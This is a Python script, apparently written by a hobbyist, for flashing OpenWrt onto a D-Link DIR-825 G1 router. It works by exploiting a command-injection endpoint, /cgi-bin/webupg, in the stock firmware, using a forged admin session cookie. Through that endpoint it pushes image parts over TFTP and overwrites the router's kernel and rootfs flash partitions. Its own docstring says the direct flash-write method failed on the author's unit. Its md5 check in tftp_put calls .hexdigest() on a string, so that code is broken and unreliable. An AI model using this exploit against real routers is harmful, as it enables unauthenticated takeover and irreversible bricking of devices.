#!/usr/bin/env python3
"""Flash OpenWrt onto DIR-825 G1 via stock-firmware RCE + TFTP (pre-brick method).

Splits sysupgrade.bin at the kernel/rootfs boundary (0x1A2D00 = 1715456),
pushes both parts over TFTP, md5-verifies on the router, writes them to
/dev/mtdblock1 (kernel) and /dev/mtdblock2 (rootfs), then reboots.

HISTORICAL NOTE: on our unit the mtdblock write path was blocked by the
Realtek mtd layer (exit -1 on write) — this script documents the intended
approach, but the write that actually reached flash was the kernel-side
update mechanism (flag file + reboot). See README warnings #3 and #6.
"""
import hashlib, os, subprocess, sys, time, urllib.parse, urllib.request

URL = "http://192.168.29.2"
KERNEL_PART = 1715456          # 0x1A2D00
TFTP_PORT = 1069


def raw(cmd, timeout=60):
    data = 'name=shell&key=twmode&cmd=' + urllib.parse.quote(cmd, safe='')
    req = urllib.request.Request(URL + '/cgi-bin/webupg', data=data.encode(), headers={
        'Referer': URL + '/autoupgrade.asp',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0',
        'Cookie': 'sessionid=ae3aa37; auth=ok; language=en_us; sys_UserName=admin',
        'Connection': 'close'})
    try:
        return urllib.request.urlopen(req, timeout=timeout).read()
    except Exception as e:
        return b"ERR:" + str(e).encode()


def rsh(cmd, timeout=60, quiet=False):
    r = raw(cmd, timeout)
    if not quiet:
        print(f"$ {cmd}\n  -> {r.decode('utf-8','replace')[:300]}")
    return r


def md5(b):
    return hashlib.md5(b).hexdigest()


def tftp_put(local, remote):
    name = os.path.basename(local)
    subprocess.run(["cp", local, f"/tmp/tftpboot/{name}"], check=True)
    rsh(f"rm -f {remote}; tftp -g -l {remote} -r {name} 192.168.29.161 {TFTP_PORT} &", quiet=True)
    for i in range(40):
        time.sleep(4)
        r = rsh(f"md5sum {remote} 2>/dev/null", quiet=True).decode('utf-8', 'replace')
        if md5(open(local, 'rb').read()).hexdigest() in r:
            print(f"  {name}: transferred + md5 OK ({os.path.getsize(local)} bytes)")
            return True
        if i == 39:
            print(f"  {name}: TRANSFER FAILED"); return False
    return False


def main():
    img = sys.argv[1] if len(sys.argv) > 1 else "sysupgrade.bin"
    blob = open(img, "rb").read()
    assert len(blob) > KERNEL_PART, "image too small"
    kernel, rootfs = blob[:KERNEL_PART], blob[KERNEL_PART:]
    open("flash_kernel.bin", "wb").write(kernel)
    open("flash_rootfs.bin", "wb").write(rootfs)
    print(f"kernel part: {len(kernel)} bytes (md5 {md5(kernel)[:12]})")
    print(f"rootfs part: {len(rootfs)} bytes (md5 {md5(rootfs)[:12]})")

    if input("type FLASH to write both partitions now: ").strip() != "FLASH":
        print("aborted"); return

    if not tftp_put("flash_kernel.bin", "/var/k.bin"): return
    if not tftp_put("flash_rootfs.bin", "/var/r.bin"): return

    print("writing kernel to /dev/mtdblock1 ...")
    r = rsh("cat /var/k.bin > /dev/mtdblock1; echo WRITE_EXIT=$?", timeout=120)
    print(r.decode('utf-8','replace')[:200])
    print("writing rootfs to /dev/mtdblock2 ...")
    r = rsh("cat /var/r.bin > /dev/mtdblock2; echo WRITE_EXIT=$?", timeout=180)
    print(r.decode('utf-8','replace')[:200])

    print("verifying flash contents ...")
    for mtd, local in [(1, "flash_kernel.bin"), (2, "flash_rootfs.bin")]:
        r = rsh(f"md5sum /dev/mtdblock{mtd}", timeout=120).decode('utf-8','replace')
        want = md5(open(local, 'rb').read())
        print(f"  mtd{mtd}: {'MATCH' if want in r else 'MISMATCH'}")

    if input("type REBOOT to restart the router: ").strip() != "REBOOT":
        print("not rebooting (flash is written; manual reboot will boot OpenWrt)"); return
    rsh("reboot")
    print("reboot sent — router should come back as OpenWrt")


if __name__ == "__main__":
    main()
